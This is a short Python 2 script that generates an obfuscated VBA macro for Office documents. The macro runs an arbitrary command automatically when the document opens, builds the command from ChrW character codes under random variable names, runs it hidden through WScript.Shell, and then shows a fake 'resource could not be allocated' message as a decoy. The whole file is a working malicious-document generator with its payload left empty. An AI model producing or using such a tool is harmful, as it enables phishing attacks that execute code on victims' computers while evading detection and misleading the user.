#!/usr/bin/env python
import string
import sys
import random

#Command you want to encode and run
cmd = ""

obfuscatedVars = []

print "Converting this command to VBA Macro:"
print cmd

print '\nMacro:'
print 'Public Sub AutoOpen()'
print '  Dim cmd As String'

for i in range(0, len(cmd)):
  if (i%10 == 0):
    obfuscatedVar = []
    obfuscatedVarName = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(15,20))
    obfuscatedVar.append("ChrW(" + str(ord(cmd[i])) + ")")
  elif (i%10 == 9):
    obfuscatedVar.append("ChrW(" + str(ord(cmd[i])) + ")")
    obfuscatedVars.append(obfuscatedVarName)
    lineToPrint = '  ' + obfuscatedVarName + ' = '
    for c in obfuscatedVar:
      lineToPrint += c + ' & '
    print lineToPrint[0:-2]
  elif (i == len(cmd) - 1):
    obfuscatedVar.append("ChrW(" + str(ord(cmd[i])) + ")")
    obfuscatedVars.append(obfuscatedVarName)
    lineToPrint = '  ' + obfuscatedVarName + ' = '
    for c in obfuscatedVar:
      lineToPrint += c + ' & '
    print lineToPrint[0:-2]
  else:
    obfuscatedVar.append("ChrW(" + str(ord(cmd[i])) + ")")

cmdString = '  cmd = '
for v in obfuscatedVars:
  cmdString += v + ' & '
print cmdString[0:-2]
#print '  Shell cmd, 0'
print '  Dim Obj as Object'
print '  Set Obj = CreateObject("WScript.Shell")'
print '  Obj.Run cmd, 0'
print '  MsgBox ("Required rescource could not be allocated")'
print 'End Sub'
